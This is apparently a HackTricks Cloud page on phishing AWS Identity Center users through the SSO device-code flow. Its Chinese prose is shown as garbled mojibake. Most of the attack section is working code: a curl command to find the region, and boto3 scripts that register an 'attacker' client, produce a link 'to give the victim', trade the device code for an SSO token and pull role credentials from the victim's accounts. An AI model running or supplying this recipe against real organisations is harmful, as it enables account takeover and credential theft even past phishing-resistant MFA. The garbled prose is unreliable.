# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## AWS è®¾å¤‡ä»£ç é’“é±¼

æœ€åˆåœ¨ [**è¿™ç¯‡åšå®¢æ–‡ç« **](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/) ä¸­æå‡ºï¼Œå¯ä»¥å‘ä½¿ç”¨ AWS SSO çš„ç”¨æˆ·å‘é€ä¸€ä¸ª **é“¾æ¥**ï¼Œå¦‚æœ **ç”¨æˆ·æ¥å—**ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿè·å–ä¸€ä¸ª **ä»¤ç‰Œä»¥å†’å……ç”¨æˆ·** å¹¶è®¿é—®ç”¨æˆ·åœ¨ **Identity Center** ä¸­èƒ½å¤Ÿè®¿é—®çš„æ‰€æœ‰è§’è‰²ã€‚

ä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå‰ææ¡ä»¶æ˜¯ï¼š

* å—å®³è€…éœ€è¦ä½¿ç”¨ **Identity Center**
* æ”»å‡»è€…å¿…é¡»çŸ¥é“å—å®³è€…ä½¿ç”¨çš„ **å­åŸŸå** `<victimsub>.awsapps.com/start`

ä»…å‡­ä¸Šè¿°ä¿¡æ¯ï¼Œ**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘ç”¨æˆ·å‘é€ä¸€ä¸ªé“¾æ¥**ï¼Œå¦‚æœ **æ¥å—**ï¼Œå°†æˆäºˆ **æ”»å‡»è€…å¯¹ AWS ç”¨æˆ·** è´¦æˆ·çš„è®¿é—®æƒé™ã€‚

### æ”»å‡»

1. **æŸ¥æ‰¾å­åŸŸå**

æ”»å‡»è€…çš„ç¬¬ä¸€æ­¥æ˜¯æ‰¾å‡ºå—å®³è€…å…¬å¸åœ¨å…¶ Identity Center ä¸­ä½¿ç”¨çš„å­åŸŸåã€‚è¿™å¯ä»¥é€šè¿‡ **OSINT** æˆ– **çŒœæµ‹ + BF** æ¥å®Œæˆï¼Œå› ä¸ºå¤§å¤šæ•°å…¬å¸ä¼šåœ¨è¿™é‡Œä½¿ç”¨å…¶åç§°æˆ–å…¶åç§°çš„å˜ä½“ã€‚

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥è·å–é…ç½® Identity Center çš„åŒºåŸŸï¼š
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **ç”Ÿæˆå—å®³è€…çš„é“¾æ¥å¹¶å‘é€**

è¿è¡Œä»¥ä¸‹ä»£ç ä»¥ç”Ÿæˆ AWS SSO ç™»å½•é“¾æ¥ï¼Œä»¥ä¾¿å—å®³è€…å¯ä»¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚\
åœ¨æ¼”ç¤ºä¸­ï¼Œåœ¨ Python æ§åˆ¶å°ä¸­è¿è¡Œæ­¤ä»£ç ï¼Œå¹¶ä¸”ä¸è¦é€€å‡ºï¼Œå› ä¸ºç¨åæ‚¨å°†éœ€è¦ä¸€äº›å¯¹è±¡æ¥è·å–ä»¤ç‰Œï¼š
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
å‘é€ç”Ÿæˆçš„é“¾æ¥ç»™å—å®³è€…ï¼Œåˆ©ç”¨ä½ å‡ºè‰²çš„ç¤¾ä¼šå·¥ç¨‹æŠ€å·§ï¼

3. **ç­‰å¾…å—å®³è€…æ¥å—**

å¦‚æœå—å®³è€…**å·²ç»ç™»å½•AWS**ï¼Œä»–åªéœ€æ¥å—æˆäºˆæƒé™ï¼›å¦‚æœæ²¡æœ‰ï¼Œä»–éœ€è¦**ç™»å½•ç„¶åæ¥å—æˆäºˆæƒé™**ã€‚\
è¿™å°±æ˜¯ç°åœ¨æç¤ºçš„æ ·å­ï¼š

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **è·å–SSOè®¿é—®ä»¤ç‰Œ**

å¦‚æœå—å®³è€…æ¥å—äº†æç¤ºï¼Œè¿è¡Œæ­¤ä»£ç ä»¥**ç”Ÿæˆä¸€ä¸ªå†’å……ç”¨æˆ·çš„SSOä»¤ç‰Œ**ï¼š
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO è®¿é—®ä»¤ç‰Œæ˜¯ **æœ‰æ•ˆæœŸä¸º 8 å°æ—¶**ã€‚

5. **å†’å……ç”¨æˆ·**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### é’ˆå¯¹ä¸å¯é’“é±¼çš„ MFA è¿›è¡Œé’“é±¼

æœ‰è¶£çš„æ˜¯ï¼Œä¹‹å‰çš„æ”»å‡»**å³ä½¿åœ¨ä½¿ç”¨â€œä¸å¯é’“é±¼çš„ MFAâ€ï¼ˆwebAuthï¼‰çš„æƒ…å†µä¸‹ä¹Ÿèƒ½å¥æ•ˆ**ã€‚è¿™æ˜¯å› ä¸ºä¹‹å‰çš„**å·¥ä½œæµç¨‹ä»æœªç¦»å¼€æ‰€ä½¿ç”¨çš„ OAuth åŸŸ**ã€‚ä¸å…¶ä»–é’“é±¼æ”»å‡»ä¸åŒï¼Œç”¨æˆ·éœ€è¦æ›¿ä»£ç™»å½•åŸŸï¼Œåœ¨è®¾å¤‡ä»£ç å·¥ä½œæµç¨‹ä¸­ï¼Œ**ä»£ç ç”±è®¾å¤‡å·²çŸ¥**ï¼Œç”¨æˆ·å³ä½¿åœ¨ä¸åŒçš„æœºå™¨ä¸Šä¹Ÿå¯ä»¥ç™»å½•ã€‚å¦‚æœæ¥å—äº†æç¤ºï¼Œè®¾å¤‡ä»…å‡­**çŸ¥é“åˆå§‹ä»£ç **ï¼Œå°±èƒ½å¤Ÿ**ä¸ºç”¨æˆ·æ£€ç´¢å‡­æ®**ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹æ­¤å¸–å­**](https://mjg59.dreamwidth.org/62175.html)ã€‚

### è‡ªåŠ¨åŒ–å·¥å…·

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## å‚è€ƒæ–‡çŒ®

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
